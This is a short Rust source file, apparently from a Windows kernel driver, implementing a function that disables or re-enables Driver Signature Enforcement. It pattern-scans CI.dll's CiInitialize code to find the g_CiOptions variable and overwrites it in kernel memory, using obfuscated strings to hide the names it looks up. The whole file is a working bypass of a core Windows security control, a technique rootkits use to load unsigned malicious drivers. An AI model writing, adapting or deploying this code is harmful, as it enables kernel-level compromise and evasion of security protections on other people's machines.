use {
    obfstr::obfstr,
    shared::structs::DSE,
    wdk_sys::{NTSTATUS, STATUS_UNSUCCESSFUL},
    crate::utils::{
        address::{get_function_address, get_module_base_address}, 
        patterns::scan_for_pattern
    },
};

pub struct Dse;

impl Dse {
    /// Sets the DSE (Driver Signature Enforcement) status based on the information provided.
    /// 
    /// # Arguments
    /// 
    /// - `info_dse`: A pointer to the `DSE` structure containing information about the state of the DSE.
    /// 
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    /// 
    pub unsafe fn set_dse_state(info_dse: *mut DSE) -> Result<(), NTSTATUS> {
        let module_address = get_module_base_address(obfstr!("CI.dll")).ok_or(STATUS_UNSUCCESSFUL)?;
        let function_address = get_function_address(obfstr!("CiInitialize"), module_address).ok_or(STATUS_UNSUCCESSFUL)?;

        // mov ecx,ebp
        let instructions = [0x8B, 0xCD];
        let c_ip_initialize = scan_for_pattern(function_address, &instructions, 3, 7, 0x89, i32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;

        // mov rbp,r9
        let instructions = [0x49, 0x8b, 0xE9];
        let g_ci_options = scan_for_pattern(c_ip_initialize as _, &instructions, 5, 9, 0x21, i32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;

        if (*info_dse).enable {
            *(g_ci_options as *mut u64) = 0x0006_u64;
        } else {
            *(g_ci_options as *mut u64) = 0x000E_u64;
        }

        Ok(())
    }
}